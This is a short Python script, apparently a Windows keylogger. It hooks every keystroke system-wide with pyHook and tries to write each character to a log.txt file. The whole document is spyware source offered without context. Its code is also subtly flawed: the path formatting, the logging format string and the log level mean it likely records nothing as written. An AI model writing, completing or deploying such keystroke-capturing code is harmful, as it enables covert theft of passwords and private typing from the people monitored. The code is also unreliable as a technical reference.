import pythoncom, pyHook ,sys,logging,os

file_log = '%r\\log.txt' %(os.getcwd())

def OnkeyboardEvent(event):
	logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)%s')
	chr(event.Ascii)
	logging.log(1,chr(event.Ascii))
	return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnkeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


